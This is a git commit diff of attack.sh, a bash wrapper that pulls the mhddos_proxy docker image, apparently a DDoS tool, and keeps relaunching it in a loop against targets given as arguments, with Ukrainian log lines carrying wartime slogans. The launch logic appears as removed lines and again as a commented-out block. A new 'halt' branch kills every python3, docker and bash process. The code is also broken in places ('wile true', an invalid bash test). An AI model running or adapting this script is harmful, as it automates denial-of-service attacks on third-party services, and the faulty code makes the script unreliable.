a3d7ee3777517d273bc3d28a5ea8d9fb028d3603
va1d3mar <Valdemarius666@protonmail.com>
2022-04-13 15:17:24 +0300

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -2,18 +2,44 @@ clear
 logfile="/var/log/attack.log"
 command=$1
 parameter=$2
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "--== Починаю процедуру атаки=--" >> $logfile
-echo "                    Слава Україні! Героям слава! Смерть путіну!" >> $logfile
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Надана команда:" "$1" >> $logfile
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Наданий параметр:" "$2" >> $logfile
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Виконую переналаштування для автоматизації виконання" >> $logfile
-command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
-command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
-command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 1200 --rpc 1000 --table"
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
-while true 
+if (command=='halt')
+then
+	pkill -KILL python3
+	pkill -KILL docker
+	pkill -KILL bash
+	systemctl restart docker.service
+fi
+tmux new-session -s attack -d
+tmux split-window -t attack -h -p 50
+tmux split-window -t attack -v -p 66
+tmux split-window -t attack -v -p 50
+tmux select-window -t attack
+
+wile true
 do
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> /var/log/attack.log & $command & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> /var/log/attack.log & sleep 15m && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 15 хвилин, перезапускаю, шоб не висло" >> /var/log/attack.log && systemctl restart docker
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер перезапущено, чекаю 5 секунд до перезапуску циклу, шоб встиг" >> /var/log/resting.log
-sleep 5
+	tmux select-window -t attack
+	tmux send-keys -t 0 "$(date "+%d.%m.%Y %H:%M:%S")" Enter
+	sleep 5
 done
+
+
+
+
+
+
+#tmux send-keys -t 1 C-z 'htop' Enter
+#tmux send-keys -t 2 C-z 'nload eth0' Enter
+#tmux send-keys -t 3 C-z 'tail -f ' "$logfile" Enter
+#echo "$(date "+%d.%m.%Y %H:%M:%S")" "--== Починаю процедуру атаки=--" >> $logfile
+#echo "                    Слава Україні! Героям слава! Смерть путіну!" >> $logfile
+#echo "$(date "+%d.%m.%Y %H:%M:%S")" "Виконую переналаштування для автоматизації виконання" >> $logfile
+#command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
+#command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
+#command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 900 --rpc 1000 --table"
+#echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
+#while true 
+#do
+#echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> $logfile & tmux select-window -t attack & tmux send-keys -t 0 "$command" Enter & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> $logfile & sleep 20 && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 900 тіків, перезапускаю, шоб не висло" >> $logfile && tmux send-keys -t 0 C-c Enter && tmux send-keys -t 0 "systemctl restart docker.service" Enter
+#echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер перезапущено, чекаю 5 тіків до перезапуску циклу, шоб встиг" >> $logfile
+#sleep 5
+#done
